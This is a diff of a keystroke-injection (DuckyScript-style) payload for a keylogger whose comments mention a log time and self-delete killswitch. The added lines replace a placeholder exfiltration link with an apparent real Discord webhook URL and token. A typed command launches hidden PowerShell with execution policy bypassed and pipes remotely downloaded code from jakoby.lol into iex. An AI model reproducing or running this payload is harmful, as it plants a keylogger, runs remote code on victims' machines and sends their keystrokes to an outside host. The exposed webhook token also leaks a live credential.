@@ -17,9 +17,9 @@ REM     $ks="12/25/2022 10:00:00 PM" <-- This will make the keylogger self delet
 
 REM     Calling the script with both a log time and killswitch will look something like this:
 
-REM     $dc='https://link.iamjakoby.com/xxxx';$log="09:00 pm";$ks="12/25/2022 10:00:00 PM";iwr "https://jakoby.lol/m2m" | iex
+REM     $dc='https://discord.com/api/webhooks/1108192935062818857/mV_LC9vCXETk2D_JeCCAqEyhZre_44CKjOwtU4e9w4blQ3QVSaffe3mlvhipRi5CvUJt';$log="09:00 pm";$ks="12/25/2022 10:00:00 PM";iwr "https://jakoby.lol/m2m" | iex
 
 GUI r
 DELAY 500
-STRING powershell -w h -NoP -Ep Bypass -command "$dc='https://link.iamjakoby.com/xxxx';$log='';$ks='';iwr 'https://jakoby.lol/m2m' | iex"
+STRING powershell -w h -NoP -Ep Bypass -command "$dc='https://discord.com/api/webhooks/1108192935062818857/mV_LC9vCXETk2D_JeCCAqEyhZre_44CKjOwtU4e9w4blQ3QVSaffe3mlvhipRi5CvUJt';$log='';$ks='';iwr 'https://jakoby.lol/m2m' | iex"
 ENTER
